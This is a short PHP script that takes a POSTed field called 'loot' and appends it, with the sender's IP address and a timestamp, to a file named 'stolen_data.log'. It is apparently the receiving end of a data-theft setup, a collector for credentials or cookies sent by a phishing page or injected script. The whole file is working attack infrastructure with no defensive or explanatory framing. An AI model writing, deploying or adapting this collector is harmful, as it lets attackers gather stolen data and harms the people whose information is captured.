<?php  
$loot = $_POST['loot'];  
$ip = $_SERVER['REMOTE_ADDR'];  
$timestamp = date("Y-m-d H:i:s");  
file_put_contents("stolen_data.log", "[$timestamp] IP: $ip\n$loot\n\n", FILE_APPEND);  
?>  
